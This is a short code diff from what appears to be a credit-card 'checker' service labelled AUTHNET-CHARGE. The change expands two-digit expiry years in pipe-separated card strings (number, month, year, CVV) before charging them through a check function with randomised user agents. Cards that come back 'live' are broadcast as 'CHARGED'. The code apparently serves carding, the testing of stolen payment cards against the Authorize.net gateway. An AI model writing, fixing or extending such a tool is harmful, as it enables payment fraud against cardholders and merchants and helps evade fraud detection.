@@ -226,9 +226,16 @@ serve(async (req) => {
       );
     }
 
+    // Convert short year (YY) to full year (YYYY)
+    let year = parts[2];
+    if (year.length === 2) {
+      year = '20' + year;
+    }
+    const formattedCc = `${parts[0]}|${parts[1]}|${year}|${parts[3]}`;
+
     console.log('[AUTHNET-CHARGE] Checking card for user:', user.id);
 
-    const data = await performCheck(cc, getRandomUserAgent());
+    const data = await performCheck(formattedCc, getRandomUserAgent());
 
     // Broadcast CHARGED cards
     if (data.computedStatus === 'live') {
